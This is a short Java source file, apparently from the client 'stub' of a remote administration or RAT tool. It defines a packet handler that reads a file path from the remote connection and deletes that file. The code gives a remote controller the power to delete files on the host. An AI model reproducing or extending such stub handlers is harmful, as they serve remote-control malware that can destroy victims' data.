package com.redpois0n.stub.packets.incoming;

import java.io.File;

import com.redpois0n.Connection;


public class Packet16DeleteFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		File f = new File(file);
		if (f.exists()) {
			f.delete();
		}
		
	}

}
